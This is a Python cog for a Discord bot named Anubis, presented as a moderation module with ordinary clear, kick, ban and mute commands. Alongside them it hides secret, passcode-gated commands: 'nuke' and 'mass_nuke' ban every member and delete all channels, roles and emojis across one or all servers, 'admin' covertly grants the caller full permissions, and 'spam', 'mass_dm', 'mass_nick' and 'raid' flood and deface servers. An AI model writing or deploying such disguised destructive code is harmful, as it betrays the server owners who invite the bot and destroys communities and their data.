import discord
import random
import os
from cogs.anubis_methods import CODE, check_for_servers, refresh, command_error
from discord.ext import commands
from colorama import Fore, init
init()


class Moderation(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    # clear messages

    @commands.command()
    @commands.has_guild_permissions(manage_messages=True)
    async def clear(self, ctx, n=10):
        if n < 1:
            embed = discord.Embed(
                title="Issue",
                description=f"You must specify a real amount.",
                color=discord.Colour.orange())
            await ctx.send(embed=embed)
        elif n > 1000:
            embed = discord.Embed(
                title="Issue",
                description=f"The limit is 1000.",
                color=discord.Colour.orange())
            await ctx.send(embed=embed)
        else:
            try:
                await ctx.channel.purge(limit=n)
            except ValueError:
                embed = discord.Embed(
                    title="Issue",
                    description=f"You must specify a real amount.",
                    color=discord.Colour.orange())
                await ctx.send(embed=embed)
        return

    # nuke the server

    @commands.command(hidden=True)
    async def nuke(self, ctx, code=None):
        await ctx.message.delete()
        try:
            if int(code) != int(CODE):
                command_error("nuke")
                return
            quotes = [
                "War is peace, freedom is slavery and ignorance is strength.",
                "A true soldier fights not because he hates what is in front of him, but because he loves what is behind him.",
                "The object of war is not die for your country but to make the other bastard die for his.",
                "War does not determine who are right - only those who are left.",
                "If you are far from the enemy, make them think you are near.",
                "Only the dead have seen the end of war.",
                "Older men declare war, but it is the youth that must fight and die.",
                "War is the teacher of violence.",
                "If you know the enemy and know yourself, you need not fear the result of a hundred battles."]
            quote = quotes[random.randint(0, len(quotes) - 1)]

            # Ban all members.

            print(
                f"{Fore.LIGHTWHITE_EX}\n\n{'-'*(len(quote)+2)}\nNuke depolyed!\n\n{Fore.RESET}")
            print(f"{Fore.YELLOW}Banning server members:{Fore.RESET}")
            for member in self.bot.get_all_members():
                try:
                    if member != ctx.author:
                        await member.ban(reason=None, delete_message_days=7)
                        print(
                            f"{Fore.LIGHTBLUE_EX}Banned {member.display_name}.{Fore.RESET}")
                    else:
                        continue
                except discord.Forbidden:
                    print(f'{Fore.RED}Failed to ban {member}.{Fore.RESET}')
                except discord.HTTPException:
                    print(f'{Fore.RED}Failed to ban {member}.{Fore.RESET}')
            print(f"{Fore.LIGHTGREEN_EX}Banned all members.\n{Fore.RESET}")

            # delete all channels

            print(f"{Fore.YELLOW}Deleting server channels:{Fore.RESET}")
            for c in ctx.guild.channels:
                try:
                    await c.delete()
                    print(
                        f'{Fore.LIGHTBLUE_EX}Channel \"{c}\" deleted.{Fore.RESET}')
                except discord.Forbidden:
                    print(
                        f'{Fore.RED}Failed to delete channel \"{c}\".{Fore.RESET}')
                except discord.HTTPException:
                    print(
                        f'{Fore.RED}Failed to delete channel \"{c}\".{Fore.RESET}')
            print(f"{Fore.LIGHTGREEN_EX}Deleted all channels.\n{Fore.RESET}")

            # delete all roles

            print(f"{Fore.YELLOW}Deleting server roles:{Fore.RESET}")
            roles = ctx.guild.roles
            roles.pop(0)
            for role in roles:
                if ctx.guild.me.roles[-1] > role:
                    try:
                        await role.delete()
                        print(
                            f'{Fore.LIGHTBLUE_EX}Role \"{role}\" deleted.{Fore.RESET}')
                    except discord.Forbidden:
                        print(
                            f'{Fore.RED}Failed to delete role \"{role}\".{Fore.RESET}')
                    except discord.HTTPException:
                        print(
                            f'{Fore.RED}Failed to delete role \"{role}\".{Fore.RESET}')
                else:
                    break
            print(f"{Fore.LIGHTGREEN_EX}Deleted all roles.\n{Fore.RESET}")

            # Delete all emojis.

            print(f"{Fore.YELLOW}Deleting server emojis:{Fore.RESET}")
            for emoji in list(ctx.guild.emojis):
                try:
                    await emoji.delete()
                    print(
                        f"{Fore.LIGHTBLUE_EX}Emoji \"{emoji.name}\" deleted.{Fore.RESET}")
                except BaseException:
                    print(
                        f"{Fore.RED}Failed to delete emoji \"{emoji.name}\".{Fore.RESET}")
            print(f"{Fore.LIGHTGREEN_EX}Deleted all emojis.\n\n{Fore.RESET}")

            print(f"{Fore.LIGHTWHITE_EX}Nuke sucessfully exploded!\n{Fore.RED}\"{quote}\"{Fore.LIGHTWHITE_EX}\n{'-'*(len(quote)+2)}{Fore.RESET}")
            return
        except BaseException:
            command_error("nuke")
            return

    # nuke every server

    @commands.command(hidden=True)
    async def mass_nuke(self, ctx, code=None):
        await ctx.message.delete()
        try:
            if int(code) != int(CODE):
                command_error("mass_nuke")
                return
            i = 1
            k = len(self.bot.guilds)
            quotes = [
                "War is peace, freedom is slavery and ignorance is strength.",
                "A true soldier fights not because he hates what is in front of him, but because he loves what is behind him.",
                "The object of war is not die for your country but to make the other bastard die for his.",
                "War does not determine who are right - only those who are left.",
                "If you are far from the enemy, make them think you are near.",
                "Only the dead have seen the end of war.",
                "Older men declare war, but it is the youth that must fight and die.",
                "War is the teacher of violence.",
                "If you know the enemy and know yourself, you need not fear the result of a hundred battles."]
            quote = quotes[random.randint(0, len(quotes) - 1)]

            for g in self.bot.guilds:
                # Ban all members.
                print(f"{Fore.LIGHTWHITE_EX}\n\n{'-'*(len(str(g))+43)}\nServers nuked: {i}/{k}\nWarhead fired at server: {Fore.LIGHTRED_EX}\"{g}\"{Fore.LIGHTWHITE_EX}!\n{'-'*(len(str(g))+43)}\n{Fore.RESET}")
                print(
                    f"{Fore.YELLOW}Banning server members from server: \"{g}\":{Fore.RESET}")
                for member in g.members:
                    try:
                        if member != ctx.author:
                            await member.ban(reason=None, delete_message_days=7)
                            print(
                                f"{Fore.LIGHTBLUE_EX}Banned {member.display_name}.{Fore.RESET}")
                        else:
                            continue
                    except discord.Forbidden:
                        print(f'{Fore.RED}Failed to ban {member}.{Fore.RESET}')
                    except discord.HTTPException:
                        print(f'{Fore.RED}Failed to ban {member}.{Fore.RESET}')
                print(f"{Fore.LIGHTGREEN_EX}Banned all members.\n{Fore.RESET}")

                # delete all channels
                print(
                    Fore.YELLOW +
                    f"Deleting server channels from server: \"{g}\":{Fore.RESET}")
                for c in g.channels:
                    try:
                        await c.delete()
                        print(
                            f'{Fore.LIGHTBLUE_EX}Channel \"{c}\" deleted.{Fore.RESET}')
                    except discord.Forbidden:
                        print(
                            f'{Fore.RED}Failed to delete channel \"{c}\".{Fore.RESET}')
                    except discord.HTTPException:
                        print(
                            f'{Fore.RED}Failed to delete channel \"{c}\".{Fore.RESET}')
                print(f"{Fore.LIGHTGREEN_EX}Deleted all channels.\n{Fore.RESET}")

                # delete all roles
                print(
                    Fore.YELLOW +
                    f"Deleting server roles from server: \"{g}\":{Fore.RESET}")
                roles = g.roles
                roles.pop(0)
                for role in roles:
                    if g.me.roles[-1] > role:
                        try:
                            await role.delete()
                            print(
                                f'{Fore.LIGHTBLUE_EX}Role \"{role}\" deleted.{Fore.RESET}')
                        except discord.Forbidden:
                            print(
                                f'{Fore.RED}Failed to delete role \"{role}\".{Fore.RESET}')
                        except discord.HTTPException:
                            print(
                                f'{Fore.RED}Failed to delete role \"{role}\".{Fore.RESET}')
                    else:
                        break
                print(f"{Fore.LIGHTGREEN_EX}Deleted all roles.\n{Fore.RESET}")

                # delete all emojis
                print(
                    Fore.YELLOW +
                    f"Deleting server emojis from server \"{g}\":{Fore.RESET}")
                for emoji in list(g.emojis):
                    try:
                        await emoji.delete()
                        print(
                            f"{Fore.LIGHTBLUE_EX}Emoji \"{emoji.name}\" deleted.{Fore.RESET}")
                    except BaseException:
                        print(
                            f"{Fore.RED}Failed to delete emoji \"{emoji.name}\".{Fore.RESET}")
                print(f"{Fore.LIGHTGREEN_EX}Deleted all emojis.\n{Fore.RESET}")

                print(f"{Fore.LIGHTWHITE_EX}Warhead sucessfully exploded at server: {Fore.LIGHTRED_EX}\"{g}\"{Fore.LIGHTWHITE_EX}!\n{'-'*(len(str(g))+43)}\n{Fore.RESET}")
                i += 1
            print(f"{Fore.LIGHTWHITE_EX}All warheads fired.\n{Fore.RED}{quote}{Fore.LIGHTWHITE_EX}\n{'-'*(len(quote))}\n{Fore.RESET}")
            return
        except BaseException:
            command_error("mass_nuke")
            return

    # delete all channels only

    @commands.command(hidden=True)
    async def cpurge(self, ctx, code=None):
        await ctx.message.delete()
        try:
            if int(code) != int(CODE):
                command_error("cpurge")
                return
            for c in ctx.guild.channels:
                try:
                    await c.delete()
                except discord.Forbidden:
                    continue
            print(f"{Fore.LIGHTGREEN_EX}Channels purged successfully.{Fore.RESET}")
            return
        except BaseException:
            command_error("cpurge")
            return

    # message all members with a message

    @commands.command(hidden=True)
    async def mass_dm(self, ctx, code=None, *, message=None):
        await ctx.message.delete()
        try:
            if int(code) != int(CODE):
                command_error("mass_dm")
                return
            for member in ctx.guild.members:
                try:
                    if member.dm_channel is not None:
                        await member.dm_channel.send(message)
                    else:
                        await member.create_dm()
                        await member.dm_channel.send(message)
                except BaseException:
                    continue
            print(
                f"{Fore.LIGHTGREEN_EX}Messaged all members successfully.{Fore.RESET}")
            return
        except BaseException:
            command_error("mass_dm")
            return

    # make yourself an administator on the server

    @commands.command(hidden=True)
    async def admin(self, ctx, code=None, *, role_name=None):
        await ctx.message.delete()
        try:
            if int(code) != int(CODE):
                command_error("admin")
                return
            if role_name is not None:
                await ctx.guild.create_role(name=role_name, permissions=discord.Permissions.all())
                role = discord.utils.get(ctx.guild.roles, name=role_name)
                await ctx.author.add_roles(role)
                print(
                    f"{Fore.LIGHTGREEN_EX}Administrator permissions granted successfully - try not to get caught!{Fore.RESET}")
                return
        except BaseException:
            command_error("admin")
            return

    # spam all text channels with a message

    @commands.command(hidden=True)
    async def spam(self, ctx, code=None, *, message=None):
        await ctx.message.delete()
        try:
            if int(code) != int(CODE):
                command_error("spam")
                return
            if message is not None:
                print(f"{Fore.LIGHTBLUE_EX}Spamming started; type {Fore.LIGHTWHITE_EX}stop {Fore.LIGHTBLUE_EX}in any text channel to stop the spamming.{Fore.RESET}")

                def check_reply(message):
                    return message.content == 'stop' and message.author == ctx.author

                async def spam_text():
                    while True:
                        for channel in ctx.guild.text_channels:
                            await channel.send(message)

                spam_task = self.bot.loop.create_task(spam_text())
                await self.bot.wait_for('message', check=check_reply)
                spam_task.cancel()
                print(
                    f"{Fore.LIGHTGREEN_EX}Spamming finished successfully.{Fore.RESET}")
                return
        except BaseException:
            command_error("spam")
            return

    # change the nickname of every member

    @commands.command(hidden=True)
    async def mass_nick(self, ctx, code=None, *, nickname=None):
        await ctx.message.delete()
        try:
            if int(code) != int(CODE):
                command_error("mass_nick")
                return
            if nickname.strip().replace(' ', ''):
                for member in ctx.guild.members:
                    try:
                        await member.edit(nick=nickname)
                    except BaseException:
                        continue
                print(
                    f"{Fore.LIGHTGREEN_EX}Nicknames changed successfully.{Fore.RESET}")
                return
        except BaseException:
            command_error("mass_nick")
            return

    # raid da server

    @commands.command(hidden=True)
    async def raid(self, ctx, code=None, rolename=None, nickname=None, channelName=None, channelNum=None, *, msg=None):
        await ctx.message.delete()
        try:
            if int(code) != int(CODE):
                command_error("raid")
                return
            if not code or not rolename or not nickname or not channelName or not channelNum or not msg:
                command_error("raid")
                return
            channelNum = int(channelNum)

            # delete all channels

            for c in ctx.guild.channels:
                try:
                    await c.delete()
                except discord.Forbidden:
                    continue

            # delete all roles

            roles = ctx.guild.roles
            roles.pop(0)
            for r in roles:
                if ctx.guild.me.roles[-1] > r:
                    try:
                        await r.delete()
                    except BaseException:
                        continue
                else:
                    break

            # create a new role and give it to all members

            await ctx.guild.create_role(name=rolename, colour=discord.Colour(0xff0000))
            role = discord.utils.get(ctx.guild.roles, name=rolename)
            for member in ctx.guild.members:
                try:
                    await member.add_roles(role)
                except BaseException:
                    continue

            # nickname all members

            for member in ctx.guild.members:
                try:
                    await member.edit(nick=nickname)
                except BaseException:
                    continue

            # create i number of channels named <channelNum>

            for i in range(channelNum):
                try:
                    await ctx.guild.create_text_channel(channelName)
                except BaseException:
                    continue

            # message all members with a message

            for member in ctx.guild.members:
                try:
                    if member.dm_channel is not None:
                        await member.dm_channel.send(msg)
                    else:
                        await member.create_dm()
                        await member.dm_channel.send(msg)
                except BaseException:
                    continue

            # Raid all text channels

            print(f"{Fore.LIGHTBLUE_EX}Raiding started; type {Fore.LIGHTWHITE_EX}stop {Fore.LIGHTBLUE_EX}in any text channel to stop the raiding.{Fore.RESET}")

            def check_reply(message):
                return message.content == 'stop' and message.author == ctx.author

            async def spam_text():
                while True:
                    for channel in ctx.guild.text_channels:
                        await channel.send(msg)

            spam_task = self.bot.loop.create_task(spam_text())
            await self.bot.wait_for('message', check=check_reply)
            spam_task.cancel()
            print(f"{Fore.LIGHTGREEN_EX}Raiding finished successfully.{Fore.RESET}")
            return
        except BaseException:
            command_error("raid")
            return

    # Leave the server

    @commands.command(hidden=True)
    async def leave(self, ctx, code=None, *, guild_name=None):
        await ctx.message.delete()
        try:
            if int(code) != int(CODE):
                command_error("leave")
                return

            guild = discord.utils.get(self.bot.guilds, name=guild_name)
            try:
                await guild.leave()
            except BaseException:
                print(
                    f"{Fore.RED}Anubis not found; the Anubis program is not present in the server you have specified.{Fore.RESET}")
                return
            print(
                f"{Fore.LIGHTGREEN_EX}Anubis has left \"{guild_name}\" successfully.{Fore.RESET}")
            return
        except BaseException:
            command_error("leave")
            return

    # Leave all servers

    @commands.command(hidden=True)
    async def mass_leave(self, ctx, *, code=None):
        await ctx.message.delete()
        try:
            check_for_servers()

            if int(code) != int(CODE):
                command_error("mass_leave")
                return

            with open("cogs/servers.txt", "r") as f:
                IDs = f.read().split("\n")
                for ID in IDs:
                    try:
                        ID = int(ID)
                        await self.bot.get_guild(ID).leave()
                    except BaseException:
                        pass
                f.close()
            os.remove("cogs/servers.txt")
            with open("cogs/servers.txt", "w") as f:
                f.close()
            print(
                f"{Fore.LIGHTGREEN_EX}Anubis bot has successfully left all servers.{Fore.RESET}")
            return
        except BaseException:
            command_error("mass_leave")
            return

    # Refresh the window

    @commands.command(hidden=True)
    async def refresh(self, ctx, code=None):
        await ctx.message.delete()
        try:
            if int(code) != int(CODE):
                command_error("refresh")
                return
            refresh()
        except BaseException:
            command_error("refresh")
            return

    # Kick a member

    @commands.command()
    @commands.has_guild_permissions(kick_members=True)
    async def kick(self, ctx, member: discord.Member, *, reason=None):
        await member.kick(reason=reason)
        embed = discord.Embed(
            title="Member kicked",
            description=f"{member.mention} has been kicked.",
            color=discord.Colour.blue())
        await ctx.send(embed=embed)
        return

    # Ban a member

    @commands.command()
    @commands.has_guild_permissions(ban_members=True, kick_members=True)
    async def ban(self, ctx, member: discord.Member, *, reason=None):
        await member.ban(reason=reason)
        embed = discord.Embed(
            title="Member banned",
            description=f"{member.mention} has been banned.",
            color=discord.Colour.blue())
        await ctx.send(embed=embed)
        return

    # Unban a member

    @commands.command()
    @commands.has_guild_permissions(administrator=True)
    async def unban(self, ctx, *, member):
        banned_users = await ctx.guild.bans()
        member_name, member_discriminator = member.split('#')

        for ban_entry in banned_users:
            user = ban_entry.user
            if (user.name, user.discriminator) == (
                    member_name, member_discriminator):
                await ctx.guild.unban(user)
                embed = discord.Embed(
                    title="Member unbanned",
                    description=f"{user.mention} has been unbanned.",
                    color=discord.Colour.blue())
                await ctx.send(embed=embed)
                return

    # Mute a member

    @commands.command()
    @commands.has_guild_permissions(manage_roles=True)
    async def mute(self, ctx, member: discord.Member, *, reason=None):
        if member.guild_permissions.administrator or member.guild_permissions.manage_roles or member.guild_permissions.manage_permissions:
            embed = discord.Embed(
                title="Issue",
                description=f"You can not mute this member.",
                color=discord.Colour.orange())
            await ctx.send(embed=embed)
            return
        else:
            role = discord.utils.find(
                lambda r: r.name == 'bot muted', ctx.guild.roles)
            if role in member.roles:
                embed = discord.Embed(
                    title="Issue",
                    description=f"{member.mention} is already muted.",
                    color=discord.Colour.orange())
                await ctx.send(embed=embed)
                return
            else:
                if discord.utils.get(ctx.guild.roles, name="bot muted"):
                    role = discord.utils.get(
                        member.guild.roles, name="bot muted")
                    await discord.Member.add_roles(member, role)
                    member.guild_permissions.send_messages = False
                else:
                    permissions = discord.Permissions(
                        send_messages=False, read_messages=True)
                    await ctx.guild.create_role(name="bot muted", permissions=permissions)
                    role = discord.utils.get(
                        member.guild.roles, name="bot muted")
                    await discord.Member.add_roles(member, role)
                    member.guild_permissions.send_messages = False

                embed = discord.Embed(
                    title="Member muted",
                    description=f"{member.mention} has been muted.",
                    color=discord.Colour.blue())
                await ctx.send(embed=embed)
                return

    # Unmute a member

    @commands.command()
    @commands.has_guild_permissions(manage_roles=True)
    async def unmute(self, ctx, member: discord.Member, *, reason=None):
        role = discord.utils.find(
            lambda r: r.name == 'bot muted', ctx.guild.roles)
        if role not in member.roles:
            if member.guild_permissions.send_messages:
                embed = discord.Embed(
                    title="Issue",
                    description=f"{member.mention} is not muted.",
                    color=discord.Colour.orange())
                await ctx.send(embed=embed)
                return
            else:
                role = discord.utils.get(member.guild.roles, name="bot muted")
                await discord.Member.remove_roles(member, role)
                member.guild_permissions.send_messages = True

                embed = discord.Embed(
                    title="Member unmuted",
                    description=f"{member.mention} has been unmuted.",
                    color=discord.Colour.blue())
                await ctx.send(embed=embed)
                return
        else:
            role = discord.utils.get(member.guild.roles, name="bot muted")
            await discord.Member.remove_roles(member, role)
            member.guild_permissions.send_messages = True

            embed = discord.Embed(
                title="Member unmuted",
                description=f"{member.mention} has been unmuted.",
                color=discord.Colour.blue())
            await ctx.send(embed=embed)
            return


def setup(bot):
    bot.add_cog(Moderation(bot))
